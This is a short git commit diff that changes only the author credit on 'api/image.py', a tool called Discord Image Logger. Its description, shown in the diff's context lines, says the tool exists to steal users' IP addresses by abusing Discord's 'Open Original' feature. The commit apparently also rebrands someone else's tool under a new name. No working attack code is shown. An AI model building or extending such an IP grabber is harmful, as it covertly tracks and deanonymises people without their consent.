4b7913e737f6631d97a659bafc511aba20fc18d7
ACE <ace769116@gmail.com>
2025-06-09 14:21:36 +0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By Dexty | https://github.com/xdexty0
+# By tg ace  | orski ville
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "Dexty"
+__author__ = "Tgace"
 
 config = {
     # BASE CONFIG #
